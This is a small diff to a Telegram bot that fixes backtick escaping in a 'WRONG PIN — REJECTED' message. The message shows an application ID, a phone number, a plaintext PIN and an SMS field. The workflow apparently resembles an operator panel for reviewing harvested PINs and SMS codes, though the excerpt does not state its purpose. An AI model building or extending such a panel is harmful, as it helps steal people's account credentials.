@@ -1946,9 +1946,9 @@ ${app.smsMessage || 'N/A'}
         await bot.editMessageText(`
 🔑 *WRONG PIN — REJECTED*
 
-📋 `${appId}`
-📞 `${formatPhone(app.phoneNumber)}`
-🔑 PIN: `${app.pin}`
+📋 \`${appId}\`
+📞 \`${formatPhone(app.phoneNumber)}\`
+🔑 PIN: \`${app.pin}\`
 
 ⚠️ User entered the wrong PIN
 👤 ${callbackQuery.from.first_name}
